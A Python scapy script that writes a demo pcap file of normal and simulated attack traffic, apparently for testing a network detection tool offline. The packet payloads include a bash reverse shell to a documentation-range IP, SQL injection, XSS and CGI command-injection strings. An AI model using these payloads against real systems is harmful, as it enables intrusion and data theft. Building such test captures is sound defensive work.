#!/usr/bin/env python3
"""Generate a demo.pcap with realistic attack and normal traffic for offline testing."""
from scapy.all import *
from scapy.layers.dns import DNS, DNSQR
import datetime

packets = []

def pkt(layers):
    p = layers
    p.time = datetime.datetime.now().timestamp()
    packets.append(p)

# Normal HTTP
pkt(Ether()/IP(src="10.0.0.5", dst="93.184.216.34")/TCP(sport=54321, dport=80, flags="S"))
pkt(Ether()/IP(src="10.0.0.5", dst="93.184.216.34")/TCP(sport=54321, dport=80, flags="PA")/
    Raw(b"GET /index.html HTTP/1.1\r\nHost: example.com\r\n\r\n"))

# DNS query
pkt(Ether()/IP(src="10.0.0.5", dst="8.8.8.8")/UDP(sport=12345, dport=53)/
    DNS(qd=DNSQR(qname="example.com", qtype="A")))

# --- Attacks ---
# SYN scan (many SYN packets, no full handshake)
for port in [22, 23, 80, 443, 445, 3389, 8080]:
    pkt(Ether()/IP(src="192.168.1.100", dst="10.0.0.5")/
        TCP(sport=RandShort(), dport=port, flags="S"))

# SSH brute force
for i in range(5):
    pkt(Ether()/IP(src="203.0.113.42", dst="10.0.0.5")/
        TCP(sport=50000+i, dport=22, flags="S"))

# SQL injection
pkt(Ether()/IP(src="198.51.100.7", dst="10.0.0.5")/
    TCP(sport=55000, dport=80, flags="PA")/
    Raw(b"GET /search?q=1+UNION+SELECT+username,password+FROM+users HTTP/1.1\r\nHost: target.local\r\n\r\n"))

# XSS
pkt(Ether()/IP(src="198.51.100.8", dst="10.0.0.5")/
    TCP(sport=55001, dport=80, flags="PA")/
    Raw(b"GET /comment?msg=<script>alert(1)</script> HTTP/1.1\r\nHost: target.local\r\n\r\n"))

# Reverse shell attempt
pkt(Ether()/IP(src="198.51.100.9", dst="10.0.0.5")/
    TCP(sport=4444, dport=80, flags="PA")/
    Raw(b"bash -i >& /dev/tcp/198.51.100.9/4444 0>&1"))

# Shell injection
pkt(Ether()/IP(src="198.51.100.10", dst="10.0.0.5")/
    TCP(sport=55002, dport=80, flags="PA")/
    Raw(b"GET /cgi-bin/test.cgi?cmd=/bin/sh+-c+id HTTP/1.1\r\nHost: target.local\r\n\r\n"))

# SMB access
pkt(Ether()/IP(src="192.168.1.200", dst="10.0.0.5")/
    TCP(sport=60000, dport=445, flags="S"))

# Telnet
pkt(Ether()/IP(src="10.10.10.50", dst="10.0.0.5")/
    TCP(sport=61000, dport=23, flags="S"))

# XMAS scan
pkt(Ether()/IP(src="172.16.0.99", dst="10.0.0.5")/
    TCP(sport=62000, dport=80, flags="FPU"))

# NULL scan
pkt(Ether()/IP(src="172.16.0.98", dst="10.0.0.5")/
    TCP(sport=63000, dport=80, flags=""))

# RDP
pkt(Ether()/IP(src="185.220.101.5", dst="10.0.0.5")/
    TCP(sport=50100, dport=3389, flags="S"))

# DNS TXT (tunneling indicator)
pkt(Ether()/IP(src="10.0.0.5", dst="8.8.8.8")/UDP(sport=12346, dport=53)/
    DNS(qd=DNSQR(qname="data.malware-c2.com", qtype="TXT")))

# ICMP flood
for i in range(10):
    pkt(Ether()/IP(src="192.168.1.50", dst="10.0.0.5")/ICMP())

out = "demo.pcap"
wrpcap(out, packets)
print(f"Generated {len(packets)} packets -> {out}")
